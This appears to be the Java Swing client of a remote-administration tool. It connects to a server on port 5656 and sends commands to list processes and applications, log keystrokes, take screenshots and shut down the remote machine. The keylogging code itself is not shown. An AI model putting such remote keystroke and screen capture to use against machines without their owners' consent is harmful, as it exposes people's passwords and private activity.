package org.example;

import javax.swing.*;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;

public class client extends JFrame {
    private JPanel contentPane;
    private JButton shutdownButton;
    private JButton keystrokeButton;
    private JButton connectButton;
    JFormattedTextField ipTextField;
    private JButton processRunningButton;
    private JButton appRunningButton;
    private JButton exitButton;
    private JButton takeScreenshotButton;
    public String s;

    public void InitializeComponent() {
        setContentPane(contentPane);
        getRootPane().setDefaultButton(connectButton);
        this.setResizable(false);
        this.pack();
        this.setTitle("Client Form");
        this.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        takeScreenshotButton.addActionListener(e -> butPic_Click());
        connectButton.addActionListener(e -> butConnect_Click());
        shutdownButton.addActionListener(e -> butShutdown_Click());
        processRunningButton.addActionListener(e -> processRunningButton_Click());
        exitButton.addActionListener(e -> butExit_Click());
        appRunningButton.addActionListener(e -> butApplicationList_Click());
        keystrokeButton.addActionListener(e -> keystrokeButton_Click());
    }
    public client() {
        InitializeComponent();
    }

    public void processRunningButton_Click() {
        if (Program.socketOfClient == null)
        {
            JOptionPane.showMessageDialog(contentPane, "Not connect to server.", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        String sCommand = "PROCESS";
        try {
            Program.nw.write(sCommand);
            Program.nw.newLine();
            Program.nw.flush();
        } catch (IOException e)
        {
            e.printStackTrace();
        }
        process viewapp = new process();
        viewapp.setVisible(true);
    }

    public void keystrokeButton_Click() {
        if (Program.socketOfClient == null)
        {
            JOptionPane.showMessageDialog(contentPane, "Not connect to server.", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        String sCommand = "KEYLOG";
        try {
            Program.nw.write(sCommand);
            Program.nw.newLine();
            Program.nw.flush();
        } catch (IOException e)
        {
            e.printStackTrace();
        }
        Keylog keylogviewapp = new Keylog();
        keylogviewapp.setVisible(true);
    }

    public void butPic_Click() {
        if (Program.socketOfClient == null)
        {
            JOptionPane.showMessageDialog(contentPane, "Not connect to server.", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        String sCommand = "TAKEPIC";
        try {
            Program.nw.write(sCommand);
            Program.nw.newLine();
            Program.nw.flush();
        } catch (IOException e)
        {
            e.printStackTrace();
        }

        pic pic_dialog = new pic();
        pic_dialog.lam();
        pic_dialog.setVisible(true);
    }
    public void butApplicationList_Click() {
        if (Program.socketOfClient == null)
        {
            JOptionPane.showMessageDialog(contentPane, "Not connect to server.", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        String sCommand = "APPLICATION";
        try {
            Program.nw.write(sCommand);
            Program.nw.newLine();
            Program.nw.flush();
        } catch (IOException e)
        {
            e.printStackTrace();
        }
        listApp listappDialog = new listApp();
        listappDialog.setVisible(true);
    }
    public void butExit_Click() {
        String sCommand = "QUIT";
        if (Program.socketOfClient != null) {
            try {
                Program.nw.write(sCommand);
                Program.nw.newLine();
                Program.nw.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        System.exit(1);
    }

    public void butShutdown_Click() {
        if (Program.socketOfClient == null)
        {
            JOptionPane.showMessageDialog(contentPane, "Not connect to server.", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        String sCommand = "SHUTDOWN";
            try {
                Program.nw.write(sCommand);
                Program.nw.newLine();
                Program.nw.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
        try {
            Program.socketOfClient.close();
        } catch (IOException e)
        {
            e.printStackTrace();
        }
        Program.socketOfClient = null;
    }

    public void butConnect_Click() {
        try {
            SocketAddress ipServer = new InetSocketAddress(ipTextField.getText(), 5656);
            Program.socketOfClient = new Socket();
            Program.socketOfClient.connect(ipServer);
        } catch (Exception e) {
            JOptionPane.showMessageDialog(contentPane, "Error: Unable to connect to server.", "Error", JOptionPane.ERROR_MESSAGE);
            Program.socketOfClient = null;
            return;
        }
        JOptionPane.showMessageDialog(contentPane, "Connect to server successfully.", "Success", JOptionPane.INFORMATION_MESSAGE);
        try {
            Program.nr = new BufferedReader(new InputStreamReader(Program.socketOfClient.getInputStream()));
            Program.nw = new BufferedWriter(new OutputStreamWriter(Program.socketOfClient.getOutputStream()));
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }
}
